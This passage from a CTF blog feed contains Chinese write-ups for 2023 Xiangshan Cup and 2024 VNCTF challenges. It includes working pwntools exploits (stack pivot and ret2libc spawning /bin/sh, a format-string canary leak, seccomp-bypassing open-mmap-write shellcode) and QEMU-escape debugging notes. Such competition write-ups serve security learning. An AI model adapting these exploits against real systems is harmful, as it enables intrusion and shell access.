p64(sys_addr)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">io.sendafter(<span class="string">&#x27;name is: &#x27;</span>, payload1)</span><br><span class="line">payload = <span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">fill(<span class="number">2</span>,payload)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="x05-总结">0x05 总结</h1>
<p>这题太遗憾了...最后也没做出来。不过做一窍不通的题收获才最大。<br />
做这道题之前还从来没接触过2.26版本以上的堆题，所以对tcachebin完全不了解。<br />
对tcachebin的第一印象如下:<br />
1. 概述<br />
1. 0x10~0x410（貌似是）的chunk 2. LIFO 3.
大小只有7，free满以后再free就会放到对应的其他bin中 4.
2.28及以下的libc不检测double free 2. 伪造chunk 1.
安全性比fastbin还差，不检验fd指向chunk的size直接申请 3. leak堆地址 1.
2.31及以下libc没有key加密，可以直接leak出对应大小的tcachebin_entry
目前就想到这些，这次多亏队友带飞，进半决赛了XD</p>
]]></content>
      <categories>
        <category>competition</category>
      </categories>
      <tags>
        <tag>Heap</tag>
        <tag>WriteUp - Reverse - Pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>comp - 2023香山杯Pwn &amp; RE-wp</title>
    <url>/2023/10/15/comp%20-%202023%E9%A6%99%E5%B1%B1%E6%9D%AFPwn%20&amp;%20RE-wp/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
香山杯！Pwn ak + RE 差几分钟就写完xxTEA啦😭
</blockquote>
<span id="more"></span>
<h1 id="re">RE</h1>
<h3 id="url从哪儿来">url从哪儿来</h3>
<p><img src="/pic/image-1.png" /></p>
<p>断点下在这，知道他会在buffer指向的地址生成一个文件，让程序跑完，能看到这个文件
<img src="/pic/image-2.png" />
ida打开，因为它问url是什么，所以我们直接看szurl <img
src="/pic/image-3.png" />
结果这个不是flag，看到url问我们是如何解密的，所以我们回到上面那一堆数据里面，我们看一下v13
<img src="/pic/image-4.png" /> flag就在这 <img
src="/pic/image-5.png" /></p>
<h1 id="pwn">Pwn</h1>
<h3 id="move">Move</h3>
<p>栈迁移到bss段的skdd，泄露puts，libcsearcher查到puts的libc是2.27，glibc-all-in-one下一个出来，然后返回main函数<br />
在skdd里写system("/bin/sh")，本来是想再栈迁移一遍，结果发现直接do_system了，稍微修改了一下就getshell了
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># exp头 ---------------------------------------------------------------</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">domain_name = <span class="string">&#x27;59.110.125.41&#x27;</span></span><br><span class="line">port = <span class="number">45341</span></span><br><span class="line">file = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"></span><br><span class="line">io = remote(domain_name,port)</span><br><span class="line"><span class="comment"># io = process(file)</span></span><br><span class="line"><span class="comment"># gdb.attach(io, &#x27;breakpoint main&#x27;)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line"><span class="comment"># ---------------------------------------------------------------------</span></span><br><span class="line">payloadload = <span class="string">b&#x27;\x78\x56\x34\x12&#x27;</span></span><br><span class="line">bss_addr = <span class="number">0x4050A0</span></span><br><span class="line">lea_addr = <span class="number">0x4012E0</span></span><br><span class="line">junk = <span class="number">0x30</span></span><br><span class="line">pop_rdi = <span class="number">0x401353</span></span><br><span class="line">start_addr = <span class="number">0x401264</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">bss_payloadload = p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(start_addr)</span><br><span class="line">io.sendafter(<span class="string">&#x27;again!\n&#x27;</span>,bss_payloadload)</span><br><span class="line">io.sendafter(<span class="string">&#x27;number&#x27;</span>,payloadload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 栈劫持 ---------------------------------------------------------------</span></span><br><span class="line">payloadload = <span class="string">b&#x27;a&#x27;</span>*junk + p64(bss_addr-<span class="number">8</span>) + p64(lea_addr)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">io.send(payloadload)</span><br><span class="line">puts_addr = u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;puts_addr   ---&gt;   &#x27;</span>,<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"><span class="comment"># libc = LibcSearcher(&#x27;puts&#x27;,puts_addr)</span></span><br><span class="line"><span class="comment"># libc_base = puts_addr - libc.dump(&#x27;puts&#x27;)</span></span><br><span class="line"><span class="comment"># sys_addr  = libc_base + libc.dump(&#x27;system&#x27;)</span></span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">sys_addr  = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh    = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_base   ---&gt;   &#x27;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;sys_addr    ---&gt;   &#x27;</span>,<span class="built_in">hex</span>(sys_addr))</span><br><span class="line"><span class="comment"># bin_sh    = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)</span></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># sh_addr = 0x402027</span></span><br><span class="line">ret_addr = <span class="number">0x40101a</span></span><br><span class="line">bss_payloadload = p64(pop_rdi) + p64(bin_sh) + p64(sys_addr)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">io.sendafter(<span class="string">&#x27;again!\n&#x27;</span>,bss_payloadload)</span><br><span class="line"><span class="comment"># payloadload = b&#x27;\x78\x56\x34\x12&#x27;</span></span><br><span class="line"><span class="comment"># io.sendafter(&#x27;number&#x27;,payloadload)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payloadload = b&#x27;a&#x27;*junk + p64(bss_addr-8) + p64(lea_addr)</span></span><br><span class="line"><span class="comment"># io.send(payloadload)</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x000000000040134c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040134e : pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000401350 : pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000401352 : pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040134b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040134f : pop rbp ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040119d : pop rbp ; ret</span></span><br><span class="line"><span class="string">0x0000000000401353 : pop rdi ; ret</span></span><br><span class="line"><span class="string">0x0000000000401351 : pop rsi ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040134d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040101a : ret</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></p>
<h3 id="pwthon">Pwthon</h3>
<p>Cpython pwn<br />
核心逻辑在.so文件里，盲打试到有格式化字符串，测试出栈大小，泄露出必要的信息就能ret2libc了<br />
gift泄露基地址和返回地址<br />
格式化字符串泄露canary<br />
通过puts泄露libc ret2libc <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">domain_name = <span class="string">&#x27;39.106.48.123&#x27;</span></span><br><span class="line">port = <span class="number">29572</span></span><br><span class="line"><span class="comment"># file = &#x27;./pwn&#x27;</span></span><br><span class="line"></span><br><span class="line">io = remote(domain_name,port)</span><br><span class="line"><span class="comment"># io = process(file)</span></span><br><span class="line"><span class="comment"># gdb.attach(io, &#x27;breakpoint main&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># elf = ELF(&#x27;./pwn&#x27;)</span></span><br><span class="line"><span class="comment"># libc = ELF(&#x27;.bc-2.27.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;&gt;&#x27;</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;gift&#x27;</span>)</span><br><span class="line">gift = <span class="built_in">int</span>(io.recvuntil(<span class="string">&#x27;\n&#x27;</span>),<span class="number">16</span>)</span><br><span class="line">base = gift- <span class="number">0x68B0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;base&#x27;</span>,base)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;gift&#x27;</span>,gift)</span><br><span class="line">io.sendline(<span class="string">b&#x27;%p-&#x27;</span>*<span class="number">31</span>+<span class="string">b&#x27;q%pq&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;q&#x27;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(io.recvuntil(<span class="string">b&#x27;q&#x27;</span>,drop=<span class="string">&#x27;Ture&#x27;</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;canary&#x27;</span>,canary)</span><br><span class="line"><span class="comment">#io.recvuntil(&#x27;\n&#x27;)</span></span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x0000000000003f8f</span> + base</span><br><span class="line">pop_rsi = <span class="number">0x0000000000003cd9</span> + base</span><br><span class="line">bss = <span class="number">0x016FC0</span>+<span class="number">0x100</span>+base</span><br><span class="line">read = <span class="number">0x3940</span>+base</span><br><span class="line">write = <span class="number">0x03760</span>+base</span><br><span class="line">op = <span class="number">0x3AE0</span>+base</span><br><span class="line">flag = <span class="number">0x000000000003c257</span>+base</span><br><span class="line">puts = <span class="number">0x3710</span>+base</span><br><span class="line">ret = <span class="number">0x000000000000301a</span>+base</span><br><span class="line"></span><br><span class="line"><span class="comment">#payload = p64(0)*0x16+p64(canary)+p64(gift)</span></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">33</span>+p64(canary)*<span class="number">2</span>+p64(pop_rdi)+p64(<span class="number">0x16078</span>+base)+p64(puts)+p64(base+<span class="number">0x99f0</span>)</span><br><span class="line"><span class="comment">#payload = b&#x27;a&#x27;</span></span><br><span class="line">io.send(<span class="string">b&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;len &quot;</span>,<span class="built_in">len</span>(payload))</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">offset=puts_addr-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">binsh=offset+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">system=offset+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = p64(<span class="number">0</span>)*<span class="number">32</span>+p64(canary)*<span class="number">3</span>+p64(pop_rdi)+p64(binsh)+p64(ret)+p64(system)</span><br><span class="line">io.sendline(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">io.sendline(payload2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></p>
<p><img src="http://localhost:4000/pic/imagexsb.png" /></p>
]]></content>
      <categories>
        <category>competition</category>
      </categories>
      <tags>
        <tag>Pwn</tag>
        <tag>WriteUp</tag>
        <tag>Reverse</tag>
        <tag>Stack</tag>
      </tags>
  </entry>
  <entry>
    <title>comp - 2024VNCTF_pwn_wp</title>
    <url>/2024/02/17/comp%20-%202024VNCTF_pwn_wp/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
没注意到今天还有一个 vnctf😭赛后复盘一下
</blockquote>
<span id="more"></span>
<h1 id="pwn">pwn</h1>
<h2 id="shellcode">shellcode</h2>
<p>签到题，禁用了 execve 相关函数，还禁用了所有与 read 和 socket send
相关的函数，也就是 ORW 缺 R</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x11 0xc000003e  if (A != ARCH_X86_64) goto 0019</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x0e 0xffffffff  if (A != 0xffffffff) goto 0019</span><br><span class="line"> 0005: 0x15 0x0d 0x00 0x00000000  if (A == read) goto 0019</span><br><span class="line"> 0006: 0x15 0x0c 0x00 0x00000011  if (A == pread64) goto 0019</span><br><span class="line"> 0007: 0x15 0x0b 0x00 0x00000013  if (A == readv) goto 0019</span><br><span class="line"> 0008: 0x15 0x0a 0x00 0x00000028  if (A == sendfile) goto 0019</span><br><span class="line"> 0009: 0x15 0x09 0x00 0x0000002c  if (A == sendto) goto 0019</span><br><span class="line"> 0010: 0x15 0x08 0x00 0x0000002e  if (A == sendmsg) goto 0019</span><br><span class="line"> 0011: 0x15 0x07 0x00 0x0000003b  if (A == execve) goto 0019</span><br><span class="line"> 0012: 0x15 0x06 0x00 0x00000127  if (A == preadv) goto 0019</span><br><span class="line"> 0013: 0x15 0x05 0x00 0x00000142  if (A == execveat) goto 0019</span><br><span class="line"> 0014: 0x15 0x04 0x00 0x00000147  if (A == preadv2) goto 0019</span><br><span class="line"> 0015: 0x15 0x03 0x00 0x000001a9  if (A == 0x1a9) goto 0019</span><br><span class="line"> 0016: 0x15 0x02 0x00 0x000001aa  if (A == 0x1aa) goto 0019</span><br><span class="line"> 0017: 0x15 0x01 0x00 0x000001ab  if (A == 0x1ab) goto 0019</span><br><span class="line"> 0018: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0019: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure>
<p>但是这种不是<code>!=</code>的 seccomp 代表了有很多其他的可能性。</p>
<p>我们知道 mmap 可以不通过 IO
直接将磁盘文件映射到内存空间当中，所以本题我们考虑用 open - mmap - write
的方式来打印 flag 文件</p>
<p>但这题也卡了我一个小时，主要卡在 mmap 的 flags 上。最开始 flags =
0x22 时 mmap 即使成功分配内存也无法将文件内容映射到内存中，最后调整为
flags=0x2 才成功映射</p>
<p>以及通过这题我还学到了 mmap 在分配内存时可以将 addr 设置为 0，这样
mmap 会自动寻找一块合适的内存，而我们知道 rax 是 mmap
的返回值，所以我们可以通过控制 rax 来获取 mmap 申请的内存地址。</p>
<p>我这里没有远程环境，不确定这种做法是否能得到 flag</p>
<p>况且之前的 NSSCTF Round18 还出现了本地能打通远程打不通的情况，可能是
flag 文件不跟 vuln 文件在同一个文件夹下</p>
<p>exp 如下</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">ip = <span class="string">&#x27;&#x27;</span>.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">file = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"><span class="comment"># io = remote(ip[0],int(ip[1]))</span></span><br><span class="line">io = process(file)</span><br><span class="line">elf = ELF(file)</span><br><span class="line"><span class="comment"># ---------------------------------------------------------------------</span></span><br><span class="line">shellcode_open  = shellcraft.<span class="built_in">open</span>(<span class="string">&quot;./flag.txt&quot;</span>)</span><br><span class="line">shellcode_mmap  = shellcraft.mmap(<span class="number">0</span>,<span class="number">0x80</span>,<span class="number">7</span>,<span class="number">0x2</span>,<span class="number">3</span>,<span class="number">0</span>)</span><br><span class="line">shellcode_write = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rsi,rax</span></span><br><span class="line"><span class="string">push 1</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">xor edx, edx</span></span><br><span class="line"><span class="string">mov dl, 0x80</span></span><br><span class="line"><span class="string">push 1</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode = shellcode_open</span><br><span class="line">shellcode += shellcode_mmap</span><br><span class="line">shellcode += shellcode_write</span><br><span class="line">shellcode = asm(shellcode)</span><br><span class="line"></span><br><span class="line">io.sendline(shellcode)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="escape_langlang_mountain2">escape_langlang_mountain2</h2>
<p>QEMU 逃逸，第一次做 ;(</p>
<p>读
<code>Dockerfile</code>，了解到它在搭起环境以后启动了<code>start.sh</code>，</p>
<p>再读 <code>start.sh</code>，了解到它启动了 <code>xinetd</code>
程序</p>
<p>再读 <code>xinetd</code>，这个程序的主要作用是监听指定
port，并根据预先定义好的配置来启动相应服务。可以看到
<code>server_args</code> 处启动了 <code>run.sh</code></p>
<p>再读 <code>run.sh</code>，发现它用 QEMU 起了一个程序，通过
<code>-device vn</code> 我们可以知道 <code>vn</code> 是作为 QEMU
中的一个 <code>pci设备</code> 存在的。</p>
<p>通过 IDA 查找字符串 <code>vn_</code> 可以找到
<code>vn_instance_init</code>，跟进调用
<code>字符串vn_instance_init</code> 的
<code>函数vn_instance_init</code>，再按 x 查看
<code>函数vn_instance_init</code> 的引用，可以看到下面还有一个
<code>vn_class_init</code> ，反汇编后看到</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">vn_class_init</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  result = PCI_DEVICE_CLASS_23(a1);</span><br><span class="line">  *(_QWORD *)(result + <span class="number">176</span>) = pci_vn_realize;</span><br><span class="line">  *(_QWORD *)(result + <span class="number">184</span>) = <span class="number">0LL</span>;</span><br><span class="line">  *(_WORD *)(result + <span class="number">208</span>) = <span class="number">0x1234</span>; <span class="comment">// 厂商ID (Vendor ID)</span></span><br><span class="line">  *(_WORD *)(result + <span class="number">210</span>) = <span class="number">0x2024</span>; <span class="comment">// 设备ID (Device ID)</span></span><br><span class="line">  *(_BYTE *)(result + <span class="number">212</span>) = <span class="number">0x10</span>;</span><br><span class="line">  *(_WORD *)(result + <span class="number">214</span>) = <span class="number">0xFF</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>通过厂商ID和设备ID，我们可以判断下列 pci 设备中
<code>00:04.0 Class 00ff: 1234:2024</code> 就是我们要找的
<code>vn</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/sys/devices/pci0000:00/0000:00:04.0 # lspci</span><br><span class="line">lspci</span><br><span class="line">00:01.0 Class 0601: 8086:7000</span><br><span class="line">00:04.0 Class 00ff: 1234:2024</span><br><span class="line">00:00.0 Class 0600: 8086:1237</span><br><span class="line">00:01.3 Class 0680: 8086:7113</span><br><span class="line">00:03.0 Class 0200: 8086:100e</span><br><span class="line">00:01.1 Class 0101: 8086:7010</span><br><span class="line">00:02.0 Class 0300: 1234:1111</span><br></pre></td></tr></table></figure>
<p>进而去<code>/sys/devices/pci0000:00/0000:00:04.0</code>
目录查看该设备 <code>mmio</code> 与 <code>pmio</code> 的注册情况</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/sys/devices/pci0000:00/0000:00:04.0 # ls -al</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">-r--r--r--    1 0        0             4096 Feb 18 12:18 resource</span><br><span class="line">-rw-------    1 0        0             4096 Feb 18 12:18 resource0</span><br><span class="line">...</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>有了 resource0 这个文件，我们就可以在exp里 <code>mmap</code>
做虚拟地址映射。</p>
<p>并且我们可以看到 <code>vn</code> 这个设备只注册了
<code>mmio</code>，那就考虑用 <a
href="https://ctf-wiki.org/pwn/virtualization/qemu/exploitation/intro/#_3">mmio攻击（点击这里了解
mmio 运行原理）</a></p>
<p>然后，本题的核心在于伪造 MemoryRegion
结构体，由于上述部分我也不清楚为什么要这样去 read 和
write，所以还需要补很多基础知识 (2.18晚)</p>
<p>花了一整个晚上的时间把 qemu 调试搞定了，明天找一下 QEMU
相关部分的源码读一下 (2.19晚)</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 记录一下如何用 docker 调试 QEMU</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 首先将 exp.c 静态编译为二进制文件</span></span><br><span class="line">gcc exp.c --static -o exp</span><br><span class="line"></span><br><span class="line"><span class="comment"># 然后解包 rootfs.cpio，参考https://www.jianshu.com/p/f08e34cf08ad 的“调试”部分</span></span><br><span class="line">hen rootfs.cpio</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将 exp 放入 /core/usr/bin 中</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 重新打包 roortfs.cpio</span></span><br><span class="line">gen rootfs.cpio</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改 run.sh </span></span><br><span class="line">vim run.sh</span><br><span class="line"><span class="comment"># #!/bin/sh</span></span><br><span class="line"><span class="comment"># ./qemu-system-x86_64 \</span></span><br><span class="line"><span class="comment">#     -L ./pc-bios \</span></span><br><span class="line"><span class="comment">#     -m 128M \</span></span><br><span class="line"><span class="comment">#     -append &quot;console=ttyS0&quot; \</span></span><br><span class="line"><span class="comment">#     -kernel bzImage \</span></span><br><span class="line"><span class="comment">#     -initrd rootfs.cpio \</span></span><br><span class="line"><span class="comment">#     -device vn \</span></span><br><span class="line"><span class="comment">#     -nographic \</span></span><br><span class="line"><span class="comment">#     -no-reboot \</span></span><br><span class="line"><span class="comment">#     -monitor /dev/null \</span></span><br><span class="line"><span class="comment">#     -smp 2 \</span></span><br><span class="line"><span class="comment">#     -s -S</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改 Dockerfile，在创建容器时安装 qemu-system-x86 gdb，这一步其实在 容器的shell里也能install，可以跳过</span></span><br><span class="line">vim Dockerfile <span class="comment"># 下面内容只是 RUN 部分，其他部分不动</span></span><br><span class="line"><span class="comment"># RUN sed -i &quot;s/http:\/\/archive.ubuntu.com/http:\/\/mirrors.tuna.tsinghua.edu.cn/g&quot; /etc/apt/sources.list &amp;&amp; \</span></span><br><span class="line"><span class="comment">#     apt-get update &amp;&amp; apt-get -y dist-upgrade &amp;&amp; \</span></span><br><span class="line"><span class="comment">#     apt-get install -y lib32z1 xinetd \</span></span><br><span class="line"><span class="comment">#                        libpixman-1-dev libepoxy-dev libpng16-16 libjpeg8-dev \</span></span><br><span class="line"><span class="comment">#                        libfdt-dev libnuma-dev libglib2.0-dev \</span></span><br><span class="line"><span class="comment">#                        libgtk-3-dev libasound2-dev libcurl4 qemu-system-x86 gdb</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># build 与 启动容器</span></span><br><span class="line">docker-compose build</span><br><span class="line">docker start vnctf</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果已经提前 docker-compose 好了，则可以直接通过 docker cp 来修改内部文件</span></span><br><span class="line">docker <span class="built_in">cp</span> /path/to/file container_name:/whatever/path/you/want/to/file</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动tmux，分页记为 pane1 和 pane2</span></span><br><span class="line"><span class="comment"># pane1:</span></span><br><span class="line">docker <span class="built_in">exec</span> -ti vnctf /bin/bash</span><br><span class="line"></span><br><span class="line"><span class="comment"># pane2:</span></span><br><span class="line">docker <span class="built_in">exec</span> -ti vnctf /bin/bash</span><br><span class="line"></span><br><span class="line"><span class="comment"># pane1:</span></span><br><span class="line">./run.sh <span class="comment"># 这里运行以后应该是什么也不会出现</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pane2:</span></span><br><span class="line">ps -ax |grep <span class="string">&quot;qemu&quot;</span> <span class="comment"># 这一步获取 qemu 的进程号PID,用于 (gdb) attach PID</span></span><br><span class="line">gdb ./qemu-system-x86_64</span><br><span class="line">(gdb) attach PID <span class="comment"># 比如 (gdb) attach 406</span></span><br><span class="line">(gdb) <span class="built_in">continue</span> <span class="comment"># 输入完以后看一眼 pane1，如果qemu启动了就等qemu启动</span></span><br><span class="line">               <span class="comment"># 如果没启动就继续输入 (gdb) continue</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pane1:</span></span><br><span class="line"><span class="comment"># 此时 QEMU 正常运行，我们可以在里面输入一些命令比如ls等查看</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pane2:</span></span><br><span class="line">(gdb) b vn_mmio_read</span><br><span class="line"></span><br><span class="line"><span class="comment"># pane1:</span></span><br><span class="line"><span class="built_in">cd</span> /usr/bin <span class="comment"># 这里是前面解包后的时候 exp 放入的文件夹</span></span><br><span class="line">./exp</span><br><span class="line"></span><br><span class="line"><span class="comment"># pane2:</span></span><br><span class="line">此时就可以开始调试了</span><br></pre></td></tr></table></figure>
<p>今晚去 ctf-wiki 上看了一下 QEMU 关于 MemoryRegion
相关的代码和结构体，但我突然意识到题目中设备的 <code>mmio_read</code> 和
<code>mmio_write</code> 是自己实现的 (比如<a
href="https://github.com/rcvalle/blizzardctf2017/blob/master/strng.c">blizzardCTF
里的 strng</a>)，所以在互联网上不会找到相关的源码，只能反汇编去硬看</p>
<p>到这里好像有点乱了，我们来捋一下：</p>
<p>QEMU 提供了一套完整的模拟硬件给 QEMU 上的 kernel 来使用，而
<code>-device</code> 参数为 kernel 提供了模拟的 pci 设备。</p>
<p>如果 kernel 实现了类似 linux 的 rootfs，我们就可以通过
<code>lspci</code> 来查看相关 pci，并在/sys/devices/...找到 pci
设备启动时 kernel 分配给 pci 的资源，也就是 resource0
等，这也是前文提到过的。</p>
<p>resource0 可以看作是一大片开关，当我们修改 resource0
中的内容时，可以看做对应开关被启动，pci设备也随着开关的启动而变化，具体表现为“控制寄存器、状态寄存器以及设备内部的内存区域
随着 resource0 的变化而变化”</p>
<p>所以我们可以 open resource0 这个文件，用 mmap
映射它，从而使我们能够在C代码中对 resource0 这片内存进行修改</p>
<p>可是由于 QEMU 也只不过是一个程序，虚拟的 pci
设备意味着，一定有一片内存存储着 pci 相关的数据</p>
<blockquote>
<p>关于 pci 存储数据的这一部分好像就涉及 QOM
了，还没太搞懂，总之跟pci_xx_realize, xx_class_init, xx_instance_init
等函数有关</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">假设我们的调用链是这样的: </span><br><span class="line">docker -&gt; QEMU -&gt; exp</span><br><span class="line"></span><br><span class="line">则 docker 会让 QEMU 误以为自己占据全部内存空间，QEMU 会让 exp 认为自己占据全部内存空间</span><br><span class="line"></span><br><span class="line">而 QEMU 的 pci 设备的 MemoryRegion 就存储在 QEMU 的堆区上，我们在程序 exp 中读写 resource0，就相当于操控 vn_mmio_read 和 vn_mmio_write 去读写 QEMU 的堆区，如果我们正好修改到 MemoryRegion 的 xx_mmio_ops 指针，就可以劫持控制流。</span><br></pre></td></tr></table></figure>
<p>那么，接下来我们要做的事情就是去读一下 vn_mmio_read 和 vn_mmio_write
的反汇编，了解怎样读写堆区内容。</p>
<p><a href="https://imgloc.com/image/oNxdA"><img
